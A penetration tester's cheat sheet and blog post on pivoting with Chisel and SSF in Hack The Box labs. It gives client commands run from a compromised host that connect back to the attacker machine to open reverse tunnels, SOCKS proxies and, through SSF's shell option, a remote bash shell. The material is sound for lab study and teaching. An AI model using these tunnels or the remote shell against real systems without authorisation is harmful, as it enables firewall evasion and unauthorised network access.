---
maquina: "Tunneling with Chisel and SSF"
dificultad: ""
os: ""
plataforma: "notas"
release: ""
retire: ""
creadores: ""
htb_url: ""
app_url: ""
url: "https://0xdf.gitlab.io/cheatsheets/chisel"
tipo: "chuleta"
en_lista_oscp: false
oscp_seccion: ""
---

![imagen](https://0xdfimages.gitlab.io/img/pipes-cover.png)

Having just [written up HTB Reddish](https://0xdf.gitlab.io/2019/01/26/htb-reddish.html), pivoting without SSH was at the top of my mind, and I’ve since learned of two programs that enable pivots, Chisel and Secure Socket Funneling (SSF). I learned about Chisel from Ippsec, and you can see [his using it to solve Reddish in his video](https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=1469s). I wanted to play with it, and figured I’d document what I learned here. I learned about SSF from another HTB user, [jkr](https://www.hackthebox.eu/home/users/profile/77141), who not only introduced me to SSF, but pulled together the examples in this post. [Update 2020-08-10] Chisel now has a built in SOCKS proxy! I also added a cheat sheet since I reference this post too often.

## Chisel

### TD;DR Cheat Sheet

Typical use. Examples assume attack box is 10.10.14.3, client is running from 10.10.10.10.

Start server listening on 8000:

`./chisel server -p 8000 --reverse`

From victim:

| Command | Notes |
|---|---|
| `chisel client 10.10.14.3:8000 R:80:127.0.0.1:80` | Listen on attack on 80, forward to localhost port 80 on client |
| `chisel client 10.10.14.3:8000 R:4444:10.10.10.240:80` | Listen on attack on 4444, forward to 10.10.10.240 port 80 |
| `chisel client 10.10.14.3:8000 R:socks` | Create SOCKS5 listener on 1080 on attack, proxy through client |

### Background

Chisel’s author describes it as:

> Chisel is a fast TCP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Written in Go (golang). Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network. Chisel is very similar to crowbar though achieves much higher performance.

What that means for me is that I can run a server on my attack box, and then connect to it from target boxes. On making that connection, I can define different kinds of tunnels I want to set up.

### Prep

I’ll clone Chisel from [its GitHub page](https://github.com/jpillora/chisel):

```console
root@kali:/opt# git clone https://github.com/jpillora/chisel.git
Cloning into 'chisel'...
remote: Enumerating objects: 33, done.
remote: Counting objects: 100% (33/33), done.
remote: Compressing objects: 100% (27/27), done.
remote: Total 1151 (delta 7), reused 18 (delta 5), pack-reused 1118
Receiving objects: 100% (1151/1151), 3.31 MiB | 19.03 MiB/s, done.
Resolving deltas: 100% (416/416), done.
```

Now, inside the chisel directory, I’ll run `go build`. It may download some additional bits, and when complete, I’ll have a chisel binary:

```console
root@kali:/opt/chisel# ls -lh chisel
-rwxr-xr-x 1 root root 10M Jan 27 06:47 chisel
```

Ippsec points out that this is 10MB, which is a large file to be moving to target in some environments. He shows how you can run `go build -ldflags="-s -w"` and reduce it to 7.5MB (where `-s` is “Omit all symbol information from the output file” or strip, and `-w` is “Omit the DWARF symbol table”). He also shows how to `upx` pack it down to 2.9MB if bandwidth is tight.

### Server

First I’ll set up the server on my local box. The `chisel` binary I built acts as both the client and the server, and if I run `./chisel --help`, I’ll see that:

```console
root@kali:/opt/chisel# ./chisel --help

  Usage: chisel [command] [--help]

  Version: 0.0.0-src

  Commands:
    server - runs chisel in server mode
    client - runs chisel in client mode

  Read more:
    https://github.com/jpillora/chisel
```

So to start the server, I’ll run `./chisel server -p [port] --reverse`. `-p` will allow me to specify what port `chisel` listens on. If I don’t proivde this, it’ll try 8080 by default, which often fails since I almost always have Burp running on 8080. `--reverse` tells the server that I want clients connecting in to be allowed to define reverse tunnels. This means clients connecting in can open listening ports on my attack box. That is what I want here, but be aware of what you’re allowed it to do.

There are other options I may want to add as well:

- `--host` allows me to define which interface to listen on, with all of them (0.0.0.0) being the default.
- `--key` allows me to generate a key pair used for the connection. This buys some security, but then again, the key will have to be sitting on the target box connecting back, so anyone who grabs it will be able to connect.
- `--authfile` and `--auth` allow me to specify user names and password necessary to connect.
- `-v` turns on verbose logging to the terminal.

### Client

I’ll move a copy of chisel to target, and run it as `./chisel client [server ip]:[server port] [remote string] [optional more remote strings]`.

Running this will connect to the server given, and create a tunnel for each give remote string.

Remote strings take the format of `<local-host>:<local-port>:<remote-host>:<remote-port>` as defined by `chisel`. I think it’s more intuitive to think of it as `<listen-host>:<listen-port>:<forward-host>:<forward-port>`, but I’ll use the names `chisel` uses in this post.

Of the four items, only the remote port is required. If no `local-host` is given, it will assume 0.0.0.0 on the client. If no `local-port` is give, it will default to the same as the `remote-port`. If no `remote-host` is given, it will default to the server. You can give it `R` for `local-host` to indicate that you want to listen on the remote host (ie, open the listener on the server). In that case, the tunnel will go in the reverse direction.

### Examples

#### Basic Client Listener

A silly example that illustrats listening on the client. I am on a target that can’t connect to the internet, but can route to my attacking machine. I’ll use `chisel` to create a tunnel to the site I want to download from as follows:

- `./chisel server -p 8000` on my attacker box.
- `./chisel client 1.1.1.1:8000 9001:www.exploit-db.com:443` on the compromised box. This will connect back to my box, and start a listener on the target box. Any traffic sent to that listening port will be tunneled to my box, and then routed to www.exploit-db.com.
- I can then use `wget` or `curl` to connect to `127.0.0.1:9001` and get things from the site. Depending on how the site is configured, I may have to turn off certificate checking, and/or modify the headers (such as Host) to get it to connect.

![imagen](https://0xdfimages.gitlab.io/img/chisel-1.png)

#### Basic Server Listener

A more interesting example is one like I faced in Reddish. I exploited a webapp, and needed to pivot into the network behind it. Since I was in a container, only the webapp port (in this case 1880) was forwarded through to the container, so I couldn’t just listen on another port.

In this case, I’ll use a reverse tunnel to open a listening port on my attack host that can now talk to hosts behind my initial compromised host:

- `./chisel server -p 8000 --reverse` on my local box.
- `./chisel client 1.1.1.1:8000 R:80:3.3.3.4:80` on the target. This will open a listener on port 80 on my attack box, and any connections to that port will be forwarded to the target, which will pass them to port 80 on 3.3.3.4.

![imagen](https://0xdfimages.gitlab.io/img/chisel-2.png)

#### Socks Proxy

*Update 10 Aug 2020*: As of [version 1.5.0](https://github.com/jpillora/chisel/releases/tag/v1.5.0), Chisel now has a Socks option built in.

On attack run `./clisel server -p 8000 --reverse`.

On box you want to proxy through run `./chisel client 1.1.1.1:8000 R:socks`.

This will start a listener on attack on port 1080 which is a SOCKS5 proxy through the Chisel client.

*Original Text:*

Ippsec showed this at the end of his video, and it’s worth seeing. `chisel` only let’s the server act as a socks proxy. But, in the case of Reddish, I don’t have a way to connect directly to that server. I’ll use `chisel` to set up a tunnel so I can connect to another `chisel` in the opposite direction:

- `./chisel server -p 8000 --reverse` on local box, as usual.
- `./chisel client 1.1.1.1:8000 R:8001:127.0.0.1:9001` on target box. Now anything I send to localhost:8001 on attack box will forward to localhost:9001 on target.
- `./chisel server -p 9001 --socks5` on target. Now I have a `chisel` server listening on 9001, in socks mode, and a way to get traffic to that port.
- `./chisel client localhost:8001 socks` on attack box. This connection is forwarded through the first tunnel and connects to the `chisel` server running on the box. Now my local host is listening on port 1080 (default, can change that with arguments) and will send traffic to target, and then proxy it outbound.

![imagen](https://0xdfimages.gitlab.io/img/chisel-3.png)

Now I can use `proxychains` or `FoxyProxy` to interact with the network behind the target natually.

#### More Complex Examples

At this point, these tunnels can be used to create more complex setups. For example, to go even more layers deep into a network, I can set up listeners on the first hop that forward back to the `chisel` server on attack, and then create new `chisel` reverse tunnels from there.

## SSF

### Prep

SSF is using an SSL encrypted communication channel and therefore I will need certificates and keys. The easy way is to checkout the [GitHub repository](https://github.com/securesocketfunneling/ssf) and use the included `certs` subdirectory. Also I will use the pre-compiled binaries provided and downloadable under Releases in GitHub.

The client directory will look like:

```console
$ find .
.
./ssf
./certs
./certs/trusted
./certs/trusted/ca.crt
./certs/server.key
./certs/dh4096.pem
./certs/certificate.crt
./certs/private.key
./certs/server.crt
```

I’ll also demonstrate the shell option, which is not on by default. To do so, I will create following `config.json` in the same directory:

```json
{
  "ssf": {
    "services": {
      "datagram_forwarder": { "enable": true },
      "datagram_listener": { "enable": true, "gateway_ports": false },
      "stream_forwarder": { "enable": true }, "stream_listener": { "enable": true, "gateway_ports": false },
      "copy": { "enable": false },
      "shell": { "enable": true, "path": "/bin/bash", "args": "" },
      "socks": { "enable": true }
    }
  }
}
```

The whole directory needs to be uploaded to target machine.

### Server

On my attack machine I’ll start the SSF daemon:

```console
$ ./ssfd
[2019-01-23T21:05:23+01:00] [info] [config] [tls] CA cert path: <file: ./certs/trusted/ca.crt>
[2019-01-23T21:05:23+01:00] [info] [config] [tls] cert path: <file: ./certs/certificate.crt>
[2019-01-23T21:05:23+01:00] [info] [config] [tls] key path: <file: ./certs/private.key>
[2019-01-23T21:05:23+01:00] [info] [config] [tls] key password: <>
[2019-01-23T21:05:23+01:00] [info] [config] [tls] dh path: <file: ./certs/dh4096.pem>
[2019-01-23T21:05:23+01:00] [info] [config] [tls] cipher suite: <DHE-RSA-AES256-GCM-SHA384>
[2019-01-23T21:05:23+01:00] [info] [config] [http proxy] <None>
[2019-01-23T21:05:23+01:00] [info] [config] [socks proxy] <None>
[2019-01-23T21:05:23+01:00] [info] [config] [circuit] <None>
[2019-01-23T21:05:23+01:00] [info] [ssfd] listening on <*:8011>
[2019-01-23T21:05:23+01:00] [info] [ssfd] running (Ctrl + C to stop)
```

Now the server is running on port 8011, which is the default port. I can change the port with the `-p [port]` option.

### Client

On target host I will start the client, telling it to connect back to my box. I’ll use the following options:

- `-g` - allow gateway ports. This allows client to bind local sockets to address besides localhost.
- `-F 1080` - This runs a socks proxy on the server on port 1080.
- `-Y 1111` - This opens local port 1111 as a shell on the client.
- `-L 172.19.0.4:2222:10.10.14.3:2222` and `-L 172.19.0.4:3333:10.10.14.3:3333` - These will open listeners on the target machine that will forwards back to my attacker box. This will come in handy when I want to exploit further machines that can’t talk to my attacker box directly.

```console
# ./ssf -g -F 1080 -Y 1111 -L 172.19.0.4:2222:10.10.14.3:2222 -L 172.19.0.4:3333:10.10.14.3:3333 10.10.14.3
[2019-01-23T20:04:34+00:00] [info] [config] loading file <config.json>
[2019-01-23T20:04:34+00:00] [info] [config] [tls] CA cert path: <file: ./certs/trusted/ca.crt>
[2019-01-23T20:04:34+00:00] [info] [config] [tls] cert path: <file: ./certs/certificate.crt>
[2019-01-23T20:04:34+00:00] [info] [config] [tls] key path: <file: ./certs/private.key>
[2019-01-23T20:04:34+00:00] [info] [config] [tls] key password: <>
[2019-01-23T20:04:34+00:00] [info] [config] [tls] dh path: <file: ./certs/dh4096.pem>
[2019-01-23T20:04:34+00:00] [info] [config] [tls] cipher suite: <DHE-RSA-AES256-GCM-SHA384>
[2019-01-23T20:04:34+00:00] [info] [config] [http proxy] <None>
[2019-01-23T20:04:34+00:00] [info] [config] [socks proxy] <None>
[2019-01-23T20:04:34+00:00] [info] [config] [microservices][shell] path: </bin/bash>
[2019-01-23T20:04:34+00:00] [info] [config] [circuit] <None>
[2019-01-23T20:04:34+00:00] [info] [ssf] connecting to <10.10.14.3:8011>
[2019-01-23T20:04:34+00:00] [info] [ssf] running (Ctrl + C to stop)
[2019-01-23T20:04:34+00:00] [info] [client] connection attempt 1/1
[2019-01-23T20:04:34+00:00] [info] [client] connected to server
[2019-01-23T20:04:34+00:00] [info] [client] running
[2019-01-23T20:04:35+00:00] [info] [microservice] [shell]: start server on fiber port 1111
[2019-01-23T20:04:35+00:00] [info] [client] service <remote-shell> OK
[2019-01-23T20:04:35+00:00] [info] [microservice] [socks]: start server on fiber port 1080
[2019-01-23T20:04:35+00:00] [info] [client] service <remote-socks> OK
[2019-01-23T20:04:35+00:00] [info] [microservice] [stream_listener]: forward TCP connections from <172.19.0.4:2222> to 2222
[2019-01-23T20:04:35+00:00] [info] [client] service <tcp-forward> OK
[2019-01-23T20:04:35+00:00] [info] [microservice] [stream_listener]: forward TCP connections from <172.19.0.4:3333> to 3333
[2019-01-23T20:04:35+00:00] [info] [client] service <tcp-forward> OK
```

I now have following setup:

- Listening socket on `attack:1080` that is providing a SOCKS proxy to the network behind the target.
- Listening socket on `attack:1111` that is providing a shell to the target.
- Tunnels from target box back to local sockets for future shells or file uploads.

## Summary

Both Chisel and SSF are neat frameworks that I can use to enable pivoting when ssh and forward connections in-bound aren’t independently possible. These are both tools I’ll keep in my tool box moving forward.

Thanks to [jkr](https://www.hackthebox.eu/home/users/profile/77141) for putting together much of the notes and documentation for the SSF section.
